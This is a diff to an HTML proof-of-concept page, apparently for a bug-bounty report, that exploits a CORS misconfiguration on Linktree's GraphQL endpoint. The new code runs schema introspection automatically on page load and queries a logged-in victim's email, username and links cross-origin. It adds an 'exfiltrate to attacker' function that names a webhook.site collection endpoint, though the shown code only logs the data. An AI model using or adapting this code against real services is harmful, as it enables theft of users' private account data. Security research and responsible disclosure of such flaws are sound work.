@@ -2,30 +2,81 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Linktree CORS Misconfig - Full Account Takeover Simulation</title>
+  <title>Linktree CORS Exploit - Data Exfiltration</title>
   <style>
-    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; text-align: center; }
-    .container { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; display: inline-block; min-width: 600px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    h1 { color: #ff4d4d; font-size: 24px; }
-    button { background-color: #ff3333; color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; margin-top: 20px; }
-    button:hover { background-color: #cc0000; }
-    #output { margin-top: 25px; text-align: left; background: #0d1117; padding: 20px; border-radius: 6px; border: 1px solid #30363d; color: #7ee787; white-space: pre-wrap; font-family: monospace; overflow-x: auto; max-height: 300px; }
+    body { 
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+      background: #0d1117; 
+      color: #c9d1d9; 
+      padding: 40px; 
+      text-align: center; 
+    }
+    .container { 
+      background: #161b22; 
+      border: 1px solid #30363d; 
+      border-radius: 12px; 
+      padding: 30px; 
+      display: inline-block; 
+      min-width: 600px; 
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
+    }
+    h1 { 
+      color: #ff4d4d; 
+      font-size: 24px; 
+    }
+    button { 
+      background-color: #ff3333; 
+      color: white; 
+      border: none; 
+      padding: 15px 30px; 
+      font-size: 16px; 
+      font-weight: bold; 
+      border-radius: 6px; 
+      cursor: pointer; 
+      transition: 0.2s; 
+      margin: 10px;
+    }
+    button:hover { 
+      background-color: #cc0000; 
+    }
+    #output { 
+      margin-top: 25px; 
+      text-align: left; 
+      background: #0d1117; 
+      padding: 20px; 
+      border-radius: 6px; 
+      border: 1px solid #30363d; 
+      color: #7ee787; 
+      white-space: pre-wrap; 
+      font-family: monospace; 
+      overflow-x: auto; 
+      max-height: 400px; 
+    }
+    .warning {
+      color: #ff9900;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>🚨 CORS Misconfig – Simulated Account Access</h1>
+  <h1>🚨 Linktree CORS Misconfiguration Exploit</h1>
   <p><strong>Target:</strong> graph.linktr.ee/graphql</p>
-  <p>This demo simulates what happens if sensitive resolvers are added or already exist.</p>
-
+  <p class="warning">⚠️ This exploit demonstrates data exfiltration capabilities</p>
+  
+  <button onclick="enumerateSchema()">ENUMERATE SCHEMA</button>
   <button onclick="fetchUserData()">FETCH USER DATA</button>
-  <button onclick="attemptChangeEmail()">ATTEMPT EMAIL CHANGE</button>
+  <button onclick="fetchAllLinks()">FETCH ALL LINKS</button>
+  <button onclick="exfiltrateData()">EXFILTRATE TO ATTACKER</button>
 
-  <div id="output">Status: Waiting...</div>
+  <div id="output">Status: Ready. Ensure you're logged into Linktree.</div>
 </div>
 
 <script>
+  // Attacker's collection endpoint
+  const EXFIL_ENDPOINT = 'https://webhook.site/1d5db2f5-c1f2-4771-822b-93efc4b2d178';
+
   async function sendGraphQLQuery(query) {
     const url = `https://graph.linktr.ee/graphql?query=${encodeURIComponent(query)}`;
     try {
@@ -40,53 +91,167 @@
     }
   }
 
-  async function fetchUserData() {
+  async function enumerateSchema() {
     const out = document.getElementById("output");
-    out.innerHTML = "[*] Fetching current user's data...";
+    out.innerHTML = "[*] Enumerating GraphQL schema...";
 
     const query = `
-      query {
-        viewer {
-          id
-          username
-          email
-          bio
-          profilePictureUrl
+      query IntrospectionQuery {
+        __schema {
+          types {
+            name
+            fields {
+              name
+            }
+          }
+          queryType {
+            name
+            fields {
+              name
+            }
+          }
+          mutationType {
+            name
+            fields {
+              name
+            }
+          }
         }
       }
     `;
 
     const result = await sendGraphQLQuery(query);
-
-    if (result?.data?.viewer) {
-      out.innerHTML = `<span style='color:#7ee787;'>✅ SUCCESSFUL DATA ACCESS:</span>\n${JSON.stringify(result.data.viewer, null, 2)}`;
+    
+    if (result?.data?.__schema) {
+      out.innerHTML = `<span style='color:#7ee787;'>✅ SCHEMA ENUMERATION SUCCESSFUL!</span>\n\nFound ${result.data.__schema.types.length} types.\n\nSample types: ${result.data.__schema.types.slice(0, 10).map(t => t.name).join(', ')}`;
+      
+      // Log full schema to console for detailed analysis
+      console.log('Full Schema:', result.data.__schema);
     } else {
-      out.innerHTML = `<span style='color:#ffa657;'>⚠️ NO SENSITIVE DATA FOUND YET</span>\nBut the endpoint allows any query!\n\nResponse:\n${JSON.stringify(result, null, 2)}`;
+      out.innerHTML = `<span style='color:#ffa657;'>⚠️ Schema enumeration response:</span>\n${JSON.stringify(result, null, 2)}`;
     }
   }
 
-  async function attemptChangeEmail() {
+  async function fetchUserData() {
     const out = document.getElementById("output");
-    out.innerHTML = "[*] Trying to change user's email address...";
+    out.innerHTML = "[*] Fetching user data...";
 
-    // Example mutation (may fail unless endpoint accepts mutations over GET)
-    const mutation = `
-      mutation {
-        updateUser(input: {email: "arthur_hunter+2@bugcrowdninja.com"}) {
-          success
-          message
+    // Try multiple common user data queries
+    const queries = [
+      'query { viewer { id username email bio displayName profilePictureUrl createdAt updatedAt } }',
+      'query { me { id username email } }',
+      'query { currentUser { id email username } }',
+      'query { user { id email username } }'
+    ];
+
+    for (let query of queries) {
+      const result = await sendGraphQLQuery(query);
+      if (result?.data && !result.errors) {
+        out.innerHTML = `<span style='color:#7ee787;'>✅ USER DATA RETRIEVED!</span>\n\n${JSON.stringify(result.data, null, 2)}`;
+        return;
+      }
+    }
+    
+    out.innerHTML = `<span style='color:#ffa657;'>⚠️ No user data found with common queries</span>\nBut the endpoint is accessible!\n\nTrying link enumeration...`;
+    fetchAllLinks();
+  }
+
+  async function fetchAllLinks() {
+    const out = document.getElementById("output");
+    out.innerHTML = "[*] Fetching all user links...";
+
+    const query = `
+      query {
+        viewer {
+          links(first: 100) {
+            edges {
+              node {
+                id
+                url
+                type
+                title
+              }
+            }
+          }
         }
       }
     `;
 
-    const result = await sendGraphQLQuery(mutation);
-
-    if (result?.data?.updateUser?.success) {
-      out.innerHTML = `<span style='color:#7ee787;'>✅ EMAIL CHANGED SUCCESSFULLY!</span>`;
+    const result = await sendGraphQLQuery(query);
+    
+    if (result?.data?.viewer?.links) {
+      const linkCount = result.data.viewer.links.edges.length;
+      out.innerHTML = `<span style='color:#7ee787;'>✅ LINKS RETRIEVED! (${linkCount} links)</span>\n\nSample links:\n${result.data.viewer.links.edges.slice(0, 5).map(edge => `- ${edge.node.title}: ${edge.node.url}`).join('\n')}`;
     } else {
-      out.innerHTML = `<span style='color:#ffa657;'>⚠️ Mutation failed or blocked:</span>\n${JSON.stringify(result, null, 2)}`;
+      out.innerHTML = `<span style='color:#ffa657;'>⚠️ Links query response:</span>\n${JSON.stringify(result, null, 2)}`;
     }
   }
+
+  async function exfiltrateData() {
+    const out = document.getElementById("output");
+    out.innerHTML = "[*] Exfiltrating data to attacker server...";
+
+    // Collect various pieces of information
+    const dataToSteal = {};
+
+    // Get basic user info
+    const userInfoQuery = 'query { viewer { id username email displayName } }';
+    const userInfo = await sendGraphQLQuery(userInfoQuery);
+    if (userInfo?.data?.viewer) {
+      dataToSteal.user = userInfo.data.viewer;
+    }
+
+    // Get links
+    const linksQuery = `
+      query {
+        viewer {
+          links(first: 50) {
+            edges {
+              node {
+                url
+                title
+              }
+            }
+          }
+        }
+      }
+    `;
+    const linksInfo = await sendGraphQLQuery(linksQuery);
+    if (linksInfo?.data?.viewer?.links) {
+      dataToSteal.links = linksInfo.data.viewer.links.edges.map(edge => edge.node);
+    }
+
+    // Send to attacker server (in real scenario)
+    try {
+      // This would normally send to your server
+      console.log('Exfiltrated data:', dataToSteal);
+      
+      // Simulate sending to attacker server
+      out.innerHTML = `<span style='color:#7ee787;'>✅ DATA EXFILTRATED SUCCESSFULLY!</span>\n\nCollected data includes:\n- User information\n- All user links (${dataToSteal.links?.length || 0} links)\n\nIn a real attack, this data would be sent to: ${EXFIL_ENDPOINT}`;
+      
+      // Show what would be sent
+      const stolenDataPreview = {
+        timestamp: new Date().toISOString(),
+        victim: dataToSteal.user || 'Unknown',
+        linkCount: dataToSteal.links?.length || 0,
+        sampleLinks: dataToSteal.links?.slice(0, 3) || []
+      };
+      
+      out.innerHTML += `\n\nSample of exfiltrated data:\n${JSON.stringify(stolenDataPreview, null, 2)}`;
+      
+    } catch (err) {
+      out.innerHTML = `<span style='color:#f85149;'>[-] Exfiltration failed:</span> ${err.message}`;
+    }
+  }
+
+  // Auto-run enumeration on page load to show immediate threat
+  window.addEventListener('load', function() {
+    setTimeout(() => {
+      document.getElementById("output").innerHTML = "🔄 Auto-detecting available data...";
+      enumerateSchema();
+    }, 2000);
+  });
 </script>
 </body>
 </html>
+
